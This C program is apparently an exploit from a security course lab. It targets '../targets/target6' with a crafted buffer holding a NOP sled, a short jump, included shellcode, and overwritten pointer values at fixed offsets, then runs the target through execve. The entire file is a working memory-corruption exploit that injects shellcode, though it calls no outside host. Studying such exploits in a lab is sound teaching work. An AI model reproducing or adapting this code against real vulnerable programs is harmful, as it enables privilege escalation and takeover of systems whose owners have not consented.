#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target6"
#define BUFFER_SIZE 256
#define NOP 0x90

int main(void)
{
        char *args[3];
        char *env[1];

        char attack_buffer[BUFFER_SIZE];

        int i;
        for (i = 0; i < 256; i++)
        {
                attack_buffer[i] = NOP;
        }

        short *a = (short *) &attack_buffer[0];
        *a = 0x08eb;

        char *ptr1 = (char *) &attack_buffer[4];
        *ptr1 = 0x1;

        char *ptr = attack_buffer + 12;
        for (i = 0; i < strlen(shellcode); i++)
        {
                ptr[i] = shellcode[i];
        }

        int *c = (int *) &attack_buffer[72];
        *c = 0x0104ee28;

        int *d = (int *) &attack_buffer[76];
        *d = 0x40a4fe68;


        attack_buffer[80] = 0x00;

        args[0] = TARGET;
        args[1] = attack_buffer;
        args[2] = NULL;

        env[0] = NULL;

        if (0 > execve(TARGET, args, env))
                fprintf(stderr, "execve failed.\n");

        return 0;
}